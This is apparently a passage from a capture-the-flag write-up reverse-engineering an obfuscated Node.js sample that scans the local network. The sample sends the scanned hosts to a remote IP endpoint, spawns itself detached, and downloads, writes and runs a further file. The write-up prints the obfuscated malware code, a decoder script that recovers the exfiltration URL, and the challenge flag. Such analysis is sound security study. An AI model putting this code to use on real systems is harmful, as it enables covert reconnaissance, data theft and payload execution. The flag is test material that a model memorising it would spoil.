        await Promise[RJjacHnh$bAvGggjAShOu$g(0x21f)](G_hKvvRcCRe), EzQbHadWKZ + DGTmLzroPxjYfnTIVJ_x < Z$Smftd && await FNqybBmO(EzQbHadWKZ + DGTmLzroPxjYfnTIVJ_x);
    }
    await FNqybBmO(-parseInt(0x381) + -0x2 * Math.floor(-parseInt(0x541)) + parseInt(0x1) * -parseInt(0x701)), console[GaREO$HGHSQf(0x229)](GaREO$HGHSQf(0x202) + UJErS$yNxzFl + GaREO$HGHSQf(0x1fc));
    const VaBkLKjbdHRA$_hrvsMMIg = await getArpTable();
    return VaBkLKjbdHRA$_hrvsMMIg;
}
async function sendResults(rS$ClJLTXhGgfGrRteqoNKsQu$g) {
    const TliGZFCRr$f_lF = uDOdzcLVrnBW$zxS
        , xY_WrxsfJxMwAx = TliGZFCRr$f_lF(0x241)
        , QkGLuwfbXPZgPCQrDgJeP = {
            'scanned_hosts': rS$ClJLTXhGgfGrRteqoNKsQu$g
        };
    try {
        const BKcEwFtyvecUTnu = await fetch(xY_WrxsfJxMwAx, {
            'method': TliGZFCRr$f_lF(0x242)
            , 'headers': {
                'Content-Type': TliGZFCRr$f_lF(0x22b)
            }
            , 'body': JSON[TliGZFCRr$f_lF(0x223)](QkGLuwfbXPZgPCQrDgJeP)
        });
        console[TliGZFCRr$f_lF(0x229)](TliGZFCRr$f_lF(0x22e), BKcEwFtyvecUTnu[TliGZFCRr$f_lF(0x1f2)]);
    } catch (TJTadDFVgeKsuvnbQvM$Z_cKjoQ) {
        console[TliGZFCRr$f_lF(0x229)](TliGZFCRr$f_lF(0x231), TJTadDFVgeKsuvnbQvM$Z_cKjoQ);
    }
}
async function scan() {
    const ZqRrS = uDOdzcLVrnBW$zxS
        , {
            localIp: gAPjVFOIen_HhaSXFgjQN
            , network: TDOhqeWjPGtyZLhu
        } = getLocalIpAndNetwork();
    console[ZqRrS(0x229)](ZqRrS(0x1f7) + gAPjVFOIen_HhaSXFgjQN), console[ZqRrS(0x229)](ZqRrS(0x219) + TDOhqeWjPGtyZLhu);
    const ZhUTstpIiCGdQOiVOaUPlXm = getIpRange(TDOhqeWjPGtyZLhu)
        , XwQHSggiZmEWlfRTQKXzuedsD = await arpScan(ZhUTstpIiCGdQOiVOaUPlXm);
    XwQHSggiZmEWlfRTQKXzuedsD && XwQHSggiZmEWlfRTQKXzuedsD[ZqRrS(0x22a)] > parseInt(0x1) * -parseInt(0x153d) + -parseInt(0x221c) + -0x3 * Math.ceil(-parseInt(0x1273)) && await sendResults(XwQHSggiZmEWlfRTQKXzuedsD);
}
if (process[uDOdzcLVrnBW$zxS(0x221)][-0x1 * 0x23c1 + -parseInt(0x685) * -parseInt(0x2) + parseInt(0x16b9)] === uDOdzcLVrnBW$zxS(0x23f))(async function run() {
    const YUJkQsyRox = uDOdzcLVrnBW$zxS;
    process[YUJkQsyRox(0x245)] = YUJkQsyRox(0x22c), await scan(), setInterval(scan, 0xcfbe + parseInt(0xa1d7) * Math.ceil(-parseInt(0x4)) + Number(0x476be));
}());
else {
    const childScan = spawn(process[uDOdzcLVrnBW$zxS(0x227)], [__filename, uDOdzcLVrnBW$zxS(0x23f)], {
        'detached': !![]
        , 'stdio': uDOdzcLVrnBW$zxS(0x212)
    });
    childScan[uDOdzcLVrnBW$zxS(0x1f3)]();
    const file = File[uDOdzcLVrnBW$zxS(0x1fd)](uDOdzcLVrnBW$zxS(0x220));
    file[uDOdzcLVrnBW$zxS(0x244)]()[uDOdzcLVrnBW$zxS(0x23b)](() => file[uDOdzcLVrnBW$zxS(0x20d)]())[uDOdzcLVrnBW$zxS(0x23b)](XjtazzaPgAN$GEzRdONaVFdwO => {
        const BunwlEZOV$ZQBObpRam_trGEW = uDOdzcLVrnBW$zxS;
        fs[BunwlEZOV$ZQBObpRam_trGEW(0x236)](file[BunwlEZOV$ZQBObpRam_trGEW(0x207)], XjtazzaPgAN$GEzRdONaVFdwO), fs[BunwlEZOV$ZQBObpRam_trGEW(0x20f)](file[BunwlEZOV$ZQBObpRam_trGEW(0x207)], Math.trunc(0x1) * -parseInt(0x12a7) + Math.trunc(-parseInt(0x827)) + Math.ceil(0x1cbb) * parseInt(0x1));
        const NLRMcwVnSwNd$$z = spawn(BunwlEZOV$ZQBObpRam_trGEW(0x210), ['./' + file[BunwlEZOV$ZQBObpRam_trGEW(0x207)]], {
            'detached': !![]
            , 'stdio': BunwlEZOV$ZQBObpRam_trGEW(0x212)
        });
        NLRMcwVnSwNd$$z[BunwlEZOV$ZQBObpRam_trGEW(0x1f3)](), process[BunwlEZOV$ZQBObpRam_trGEW(0x20e)](-parseInt(0x269) * Math.trunc(parseInt(0x1)) + 0x18e0 * Number(0x1) + Number(parseInt(0x3)) * -0x77d);
    })[uDOdzcLVrnBW$zxS(0x203)](SVxEQGDSDghoLvdjRkV => {
        const hfsaTsEKJKzeP = uDOdzcLVrnBW$zxS;
        console[hfsaTsEKJKzeP(0x246)](SVxEQGDSDghoLvdjRkV), process[hfsaTsEKJKzeP(0x20e)](parseFloat(-parseInt(0xbb)) * Math.floor(0x25) + parseInt(-0x1dcf) * -parseInt(0x1) + -0x2c7);
    });
}

```
### Summary Reverse Engineering check.js
I focused on the sendResults function, which contains the C2 (Command and Control) logic used to exfiltrate local IP addresses from the victim’s network to the attacker's server.
Here is code js to print connect request
```
const uDOdzcLVrnBW$zxS = WoV$tBFijDNUIz;
(function(VtGSGO$egzKqhbdzX, UkXTniOk) {
    const pqzco_KFvLt = WoV$tBFijDNUIz
        , oOByfoMkNlbqnFB = VtGSGO$egzKqhbdzX();
    while (!![]) {
        try {
            const vIyHl = -parseFloat(pqzco_KFvLt(0x209)) / (-parseInt(0x1) * -0x1d9 + parseInt(0xffa) + -parseInt(0x11d2)) * (parseFloat(pqzco_KFvLt(0x20c)) / (Number(parseInt(0x23)) * parseInt(0x11) + Math.trunc(-parseInt(0x37d)) * -0x3 + parseInt(-0xcc8))) + parseInt(-parseFloat(pqzco_KFvLt(0x228)) / (parseInt(0x2) * -0x377 + -0x1357 * -parseInt(0x1) + Number(-parseInt(0x633)) * parseInt(0x2))) + parseFloat(-parseFloat(pqzco_KFvLt(0x1f8)) / (-parseInt(0x17cc) + parseFloat(parseInt(0x19a)) + parseInt(0x1636))) * parseInt(parseFloat(pqzco_KFvLt(0x23e)) / (parseInt(0x1c1) + Math.ceil(0xbad) + Math.floor(0x1) * Math.ceil(-0xd69))) + Math['floor'](parseFloat(pqzco_KFvLt(0x1fe)) / (parseInt(0x1b94) + Math.floor(0x3) * -0x95f + parseInt(0x8f))) * (-parseFloat(pqzco_KFvLt(0x21c)) / (Math.ceil(parseInt(0x5)) * parseInt(-parseInt(0x434)) + parseFloat(parseInt(0x1573)) + -0x68)) + -parseFloat(pqzco_KFvLt(0x235)) / (Math.floor(-parseInt(0x26ad)) + Math.ceil(-parseInt(0x7db)) + Math.max(-0xa, -parseInt(0xa)) * -0x4a8) + -parseFloat(pqzco_KFvLt(0x215)) / (0xf * -parseInt(0x1) + -parseInt(0x17c5) + parseInt(parseInt(0x29)) * 0x95) * (-parseFloat(pqzco_KFvLt(0x240)) / (parseFloat(-0x1ae8) + parseInt(0xe52) + Math.trunc(0xca0))) + Number(parseFloat(pqzco_KFvLt(0x20a)) / (0x1c7f * -0x1 + Math.max(parseInt(0x169), parseInt(0x169)) + Math.floor(parseInt(0x1b21)))) * Math['floor'](parseFloat(pqzco_KFvLt(0x22d)) / (-parseInt(0x87) * -0x18 + Math.floor(parseInt(0x1)) * -parseInt(0x2f8) + 0x1 * Number(-parseInt(0x9a4))));
            if (vIyHl === UkXTniOk) break;
            else oOByfoMkNlbqnFB['push'](oOByfoMkNlbqnFB['shift']());
        } catch (a$PYsRhhF) {
            oOByfoMkNlbqnFB['push'](oOByfoMkNlbqnFB['shift']());
        }
    }
}(FCFysguDoCPBlt$j_rW, -parseInt(0x2) * parseInt(0xab223) + -parseInt(0x1) * parseFloat(0x164afd) + Math.ceil(0x3867c4)));

function FCFysguDoCPBlt$j_rW() {
    const kE$QV$Zlc = ['878c898b80b79d8a87', '8a8b8c9194', '89819797858381', '8d838a8b9681', '8d8a9081968a8588', '928588918197', 'dcd5a6bc969e9189', '94888590828b9689', '96819488858781', 'c4c4a9a5a7dec4', '07665d076649076747076757014b5a0c554507676907676707676c07674b07675807664bdec4', '898d8a', '898590878c', 'd5d3d18797b7a08888', '9794888d90', 'd5d4ca', '858888', '8c90909497decbcb89818385ca8a9ecb828d8881cbb7a08bd48da7a6b5c7d58daebd9db7a69cd1abbedd8a9d919ea1bc888ddd91afaeb6809295bdacc98a9195ae82d08680be968f8b', '85968392', '908ba88b938196a7859781', '9790968d8a838d829d', 'b48d8a83c4908bc4', '948d8a83c4c987c4d5c4c9b3c4d5c4', 'd5d6d3cad4cad4cad5', '819c8187b485908c', 'd0dcd7d4d0d4d6b38b91a39c83', '888b83', '88818a83908c', '859494888d8785908d8b8acb8e978b8a', '9787858ac4858a80c497818a808196', 'd5d6a1b088a38081', '0d6465005b45026c74016e7bc8c407665d07676207675807665b07665d07665707675807676dde', '859694c4c985', 'a5b6b407665d0766490767470767570766760d726f01436f07657307655a07657dcacaca', '0d6465005b4507664c07674d076758de', '968180918781', '07665d076649076747076757005c49dec4', '938d8ad7d6', 'ddd6dddddcd4dca194b4b187ac', '93968d9081a28d8881b79d8a87', '948d8a83c4c98ac4d5c4c993c4d5d4d4d4c4', 'c482858d888180dec4', 'adb4dec4', '8a8190938b968fad8a9081968285878197', '908c818a', 'adb492d0', 'd5ddd6cad5d2dcca', 'd6d6d6d1d18b89b5b58a86', '878c8d8880b787858a', 'd5d6ddd2d3d4bca9a2b2b7b0', '8c909094decbcbddd2cad3cad5d6dccad6d4ddcb85948dcb818a80948b8d8a90', 'b4abb7b0', '8285898d889d', '888b8580a59090968d8691908197', '908d908881', '8196968b96', '979085909197', '918a968182', '898587', '898183858e97', '93968d9081', 'ee07674907675807664f07674fadb4dec4', 'd5d4d7d2b4abaebeac94', '07677f07665d07676ce9', '9790808b9190', '85808096819797', '07677f07665d07676c', '82968b89b1b6a8', 'd6d7d4d4d0d2aa938ba08a8e', '8e8b8d8a', '94968b87819797', '9491978c', 'ee07665d076649076747076757014a68005e62dec4', '878590878c', '8081869183', '878c8d8880bb94968b87819797', '828b96a185878c', '8a858981', '979085969097b38d908c', 'd5d0d7b395b6a0bcad', 'd2d3d4ddd1d4d5d3b6a99db6b79c', '02407801635e07657307657b07677f07665d07676cde', 'd2ddd3d0a0969481a7a6', '808b938a888b8580a69182828196', '819c8d90'];
    FCFysguDoCPBlt$j_rW = function() {
        return kE$QV$Zlc;
    };
    return FCFysguDoCPBlt$j_rW();
}
function WoV$tBFijDNUIz(dL$XnoyZBnknlhIiCmEzwmu, yr$t$gwSX) {
    const t_zkek_TJFQ = FCFysguDoCPBlt$j_rW();
    return WoV$tBFijDNUIz = function(WUdwGkzbEVBepUzvjiwbh, NlmzZnWkXOvaQF$$Y) {
        WUdwGkzbEVBepUzvjiwbh = WUdwGkzbEVBepUzvjiwbh - (0x1 * Math.floor(0xec1) + 0x1 * parseInt(parseInt(0x7e1)) + Math.trunc(-0x14b0));
        let DBqcUC_bGhwXNTn$jWHczQ = t_zkek_TJFQ[WUdwGkzbEVBepUzvjiwbh];
        if (WoV$tBFijDNUIz['Qluqqr'] === undefined) {
            const LlTSrs__UZEexQjyvC = function(uydCEioFPKSAHCrsEM) {
                let xutO_S_dxEdfdSdk = -0x25 * parseInt(-parseInt(0x1d)) + 0x16b9 + -parseInt(0x1a06) & Math.ceil(-0x1128) + parseInt(0x6) * parseInt(0x562) + -parseInt(0xe25)
                    , s$GvwrdW = new Uint8Array(uydCEioFPKSAHCrsEM['match'](/.{1,2}/g)['map'](rjxrzgQ => parseInt(rjxrzgQ, parseFloat(0x31) * 0x43 + -parseInt(0x19) * parseInt(0xd) + Number(parseInt(0xb7e)) * parseInt(-0x1))))
                    , vzb_$nN = s$GvwrdW['map'](Monq$_AtE => Monq$_AtE ^ xutO_S_dxEdfdSdk)
                    , PIELHsxTQxjtFL = new TextDecoder()
                    , S_HSGp$ObSwKZaV = PIELHsxTQxjtFL['decode'](vzb_$nN);
                return S_HSGp$ObSwKZaV;
            };
            WoV$tBFijDNUIz['BYhUJP'] = LlTSrs__UZEexQjyvC, dL$XnoyZBnknlhIiCmEzwmu = arguments, WoV$tBFijDNUIz['Qluqqr'] = !![];
        }
        const qJIkgkxMUzlBjHd$PwhC = t_zkek_TJFQ[-parseInt(0x2) * Number(-0xdf3) + 0xeb2 + -0xbc * 0x3a]
            , mdif$q$Gv = WUdwGkzbEVBepUzvjiwbh + qJIkgkxMUzlBjHd$PwhC
            , dhW$ZTbNgbxwvUdYrNwNVOaHe = dL$XnoyZBnknlhIiCmEzwmu[mdif$q$Gv];
        return !dhW$ZTbNgbxwvUdYrNwNVOaHe ? (WoV$tBFijDNUIz['rzVaPm'] === undefined && (WoV$tBFijDNUIz['rzVaPm'] = !![]), DBqcUC_bGhwXNTn$jWHczQ = WoV$tBFijDNUIz['BYhUJP'](DBqcUC_bGhwXNTn$jWHczQ), dL$XnoyZBnknlhIiCmEzwmu[mdif$q$Gv] = DBqcUC_bGhwXNTn$jWHczQ) : DBqcUC_bGhwXNTn$jWHczQ = dhW$ZTbNgbxwvUdYrNwNVOaHe, DBqcUC_bGhwXNTn$jWHczQ;
    }, WoV$tBFijDNUIz(dL$XnoyZBnknlhIiCmEzwmu, yr$t$gwSX);
}
const TliGZFCRr$f_lF = uDOdzcLVrnBW$zxS
console.log(`async function sendResults(rS$ClJLTXhGgfGrRteqoNKsQu$g) {
    const TliGZFCRr$f_lF = uDOdzcLVrnBW$zxS
        , xY_WrxsfJxMwAx = ${TliGZFCRr$f_lF(0x241)}
        , QkGLuwfbXPZgPCQrDgJeP = {
            'scanned_hosts': rS$ClJLTXhGgfGrRteqoNKsQu$g
        };
    try {
        const BKcEwFtyvecUTnu = await fetch(xY_WrxsfJxMwAx, {
            'method': TliGZFCRr$f_lF(0x242)
            , 'headers': {
                'Content-Type': ${TliGZFCRr$f_lF(0x22b)}
            }
            , 'body': JSON[${TliGZFCRr$f_lF(0x223)}](QkGLuwfbXPZgPCQrDgJeP)
        });
        console[${TliGZFCRr$f_lF(0x229)}](${TliGZFCRr$f_lF(0x22e)}, BKcEwFtyvecUTnu[${TliGZFCRr$f_lF(0x1f2)}]);
    } catch (TJTadDFVgeKsuvnbQvM$Z_cKjoQ) {
        console[TliGZFCRr$f_lF(0x229)](${TliGZFCRr$f_lF(0x231)}, TJTadDFVgeKsuvnbQvM$Z_cKjoQ);
    }
}`)
```
```
async function sendResults(rS$ClJLTXhGgfGrRteqoNKsQu$g) {    
    const TliGZFCRr$f_lF = uDOdzcLVrnBW$zxS
        , xY_WrxsfJxMwAx = http://96.7.128.209/api/endpoint
        , QkGLuwfbXPZgPCQrDgJeP = {
            'scanned_hosts': rS$ClJLTXhGgfGrRteqoNKsQu$g
        };
    try {
        const BKcEwFtyvecUTnu = await fetch(xY_WrxsfJxMwAx, {
            'method': POST
            , 'headers': {
                'Content-Type': application/json
            }
            , 'body': JSON[stringify](QkGLuwfbXPZgPCQrDgJeP)
        });
        console[log](送信成功, ステータスコード:, BKcEwFtyvecUTnu[status]);
    } catch (TJTadDFVgeKsuvnbQvM$Z_cKjoQ) {
        console[log](送信エラー:, TJTadDFVgeKsuvnbQvM$Z_cKjoQ);
    }
}
```
I deobfuscated the function using a string format replacement technique.
As a result, I successfully identified the attacker's IP address and API endpoint.

>flag: CPCTF{n37scan-96_7_128_209-evil}